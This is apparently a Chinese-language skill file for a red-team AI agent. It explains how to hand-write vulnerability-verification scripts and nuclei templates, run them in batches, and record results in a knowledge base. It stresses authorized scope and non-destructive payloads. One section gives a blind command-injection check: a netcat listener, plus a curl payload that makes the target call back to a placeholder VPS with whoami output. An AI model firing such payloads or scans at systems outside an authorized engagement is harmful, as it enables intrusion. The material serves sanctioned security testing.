---
name: poc-authoring
description: 没有现成 POC 时手搓验证脚本：nuclei 模板骨架、Python 探测脚本骨架、无害判定原则与回填知识库的写法
whenToUse: redteam_poc_search 与本机 nuclei 模板都没有命中，但指纹/版本已明确指向某个 CVE；或要在批量资产上确认同一个疑似漏洞
role: exploit
enabled: true
---

# 手搓 POC（只在"查过没有"之后动手）

**先查再用**：`redteam_poc_search` 会同时搜本机沉淀的 POC 与本机 nuclei 模板库。
两边都没有才手搓——手搓的目标不是"写得漂亮"，是**能判定、能复用、能回填**。

## 一、判定一个 POC"算不算写好"

| 标准 | 具体要求 |
| --- | --- |
| **有基线** | 同一请求发两次：正常值 vs payload，响应必须能区分（状态码/长度/关键字/延时） |
| **无副作用** | 验证只用 `id`/`whoami`/`dnslog`/算术表达式；不写文件、不改配置、不删数据 |
| **可重放** | 参数化目标与命令，一条命令能重跑；输出结构化（`VULN` / `SAFE` / `ERROR`） |
| **不误报** | 404 页、WAF 页、统一错误页都要先排除（先请求一个不存在的路径存指纹） |

## 二、先做"负基线"（最省时间的一步）

```bash
# 1) 目标不存在路径长什么样（用于排除"任何路径都返回 200"的假阳性）
curl -sS -o runs/base-404.txt -w '%{http_code} %{size_download}\n' "http://<target>/__nope_$$"
# 2) 同路径不带 payload 的样子
curl -sS -o runs/base-ok.txt -w '%{http_code} %{size_download}\n' "http://<target>/<path>"
# 3) 响应里有没有 WAF 特征
grep -icE '拦截|blocked|安全狗|云锁|waf' runs/base-ok.txt
```

后面脚本里的"命中判定"必须能区分上面这三种基线，否则一定会误报。

## 三、Python 骨架（HTTP 型 POC 的默认形态）

`runs/poc_<code>.py`：

```python
#!/usr/bin/env python3
"""<组件> <CVE/CNVD> 检测：<一句话说明>
用法: python poc_xxx.py http://10.0.0.5:8080 [cmd]
判定: 仅当响应出现 <特征> 且与基线不同才输出 VULN
"""
import sys, re, requests
requests.packages.urllib3.disable_warnings()

def check(base, cmd='id'):
    s = requests.Session()
    s.headers.update({'User-Agent': 'Mozilla/5.0'})
    # 0) 基线：不存在路径的响应长度，用于排除"全站 200"
    try:
        b = s.get(base + '/__nope_9f3a', timeout=8, verify=False)
        base_len = len(b.content)
    except Exception as e:
        return 'ERROR', f'baseline failed: {e}'
    # 1) 探测请求（payload 只读、无副作用）
    url = base + '/<path>?<param>=' + requests.utils.quote('<payload>')
    try:
        r = s.get(url, timeout=10, verify=False)
    except Exception as e:
        return 'ERROR', str(e)
    body = r.text
    # 2) 命中判定：特征 + 与基线不同 + 排除 404 页
    hit = ('<特征串>' in body) and (abs(len(body) - base_len) > 20)
    if r.status_code == 404 or re.search(r'Not Found|页面不存在', body):
        return 'SAFE', f'404-like ({r.status_code})'
    return ('VULN' if hit else 'SAFE'), f'{r.status_code} len={len(body)}'

if __name__ == '__main__':
    base = sys.argv[1].rstrip('/')
    cmd = sys.argv[2] if len(sys.argv) > 2 else 'id'
    state, detail = check(base, cmd)
    print(f'{state}\t{base}\t{detail}')
```

批量跑（限速 + 断点续跑 + 结果落盘）：

```bash
while read -r u; do
  timeout 25 python runs/poc_<code>.py "$u" >> runs/poc-<code>.log 2>&1
  sleep 0.5                     # 限速：大批量时 1s 起
done < runs/targets.txt
grep '^VULN' runs/poc-<code>.log | tee runs/poc-<code>-hits.txt
```

## 四、nuclei 模板骨架（要批量复用时优先写这个）

`runs/poc-<code>.yaml`：

```yaml
id: <code>
info:
  name: <组件> <CVE> <漏洞类型>
  author: redteam
  severity: critical
  description: |
    <一句话原理 + 影响版本>
  reference:
    - <官方公告 / NVD 链接>
  tags: <组件>,<类型>,cve,cve<年份>
requests:
  - method: GET
    path:
      - "{{BaseURL}}/<path>?<param>={{url_encode('<payload>')}}"
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: word
        part: body
        words: ["<特征串1>", "<特征串2>"]
        condition: or
      - type: word
        part: body
        words: ["Not Found", "页面不存在"]
        negative: true
```

跑法与验证：

```bash
nuclei -u http://<target> -t runs/poc-<code>.yaml -v -debug-resp   # 先单目标看请求/响应
nuclei -l runs/targets.txt -t runs/poc-<code>.yaml -c 5 -rl 20 -o runs/nuclei-<code>.txt
```

> 写模板的三条硬规矩：**matcher 必须有负向条件**（排除 404/WAF 页）、
> **一次请求能判定就不要两步**（少发包）、**payload 不带写操作**。

## 五、无回显漏洞的探测（命令执行/SSRF/盲注通用）

```bash
# 用你有日志的 VPS 端口做回连（别用公共 dnslog，日志留不住）
# 1) 起监听（VPS 上）
nc -lvnp 9000
# 2) payload 里只做"访问"
curl 'http://<target>/<path>?cmd=curl%20http://<VPS>:9000/poc-$(whoami)'
# 3) 看到命中行 = 命令执行成功；行里带 whoami 结果 = 有回显通道
```

DNS 外带（HTTP 出不去时）：payload 用 `nslookup <random>.<你的域名>`，看权威 DNS 日志。
**验证阶段只回连，不执行破坏性命令**。

## 六、回填知识库（强制，这是"补全知识库"的正循环）

```text
redteam_poc_add({
  code: '<组件>-<CVE或特征>-<类型>',      // 稳定、可搜索，如 thinkphp-5022-rce
  title: 'ThinkPHP 5.0.22/5.1.29 命令执行',
  kind: 'poc',                            // poc | exp | script | template | payload
  category: 'rce',                         // 必须选 POC_CATEGORIES 里的一个
  cve: 'CVE-2018-20062', component: 'ThinkPHP', versions: '5.0.22 / 5.1.29',
  severity: 'critical', language: 'python',
  source: 'self',                          // web | self | manual | nuclei-template | kb
  description: '原理 + 影响版本 + 命中判定',
  usage: 'python poc_xxx.py http://TARGET',
  content: '<脚本或模板全文>',
  tags: 'php,thinkphp,cn,rce',
  verified: 0                              // 未实测就 0，实测成功后再 update 成 1
})
```

- **实测成功**后立刻 `redteam_poc_update`（`verified=1` + `verified_note` 写"哪台资产、什么回显"）；
- 打过目标再 `redteam_poc_use`（`used_on`）；
- 别人复用命中时，`hit_count` 会涨——排序靠前就是"最好用的武器"。

## 七、红线

1. **只在授权/演练范围内跑**：目标清单来自 `redteam_asset_query` 的落库资产，不要自行扩段。
2. **不写破坏性 exp**：`drop`/`truncate`/`rm`/`shutdown`/加密勒索类一律不做；验证只要"能证明"。
3. **不写大面积爆破**：POC 里不带字典循环；要爆口令走 `credential-attack`，带限速与账号锁定保护。
4. **发包量控制**：单目标 ≤ 5 个请求；批量时 ≤ 20 rps 并留退避。被封 IP 等于整场演练哑火。
5. **POC 正文里不留真实凭据**：把 VPS 地址/密码写成 `<VPS>`/`<password>` 占位。
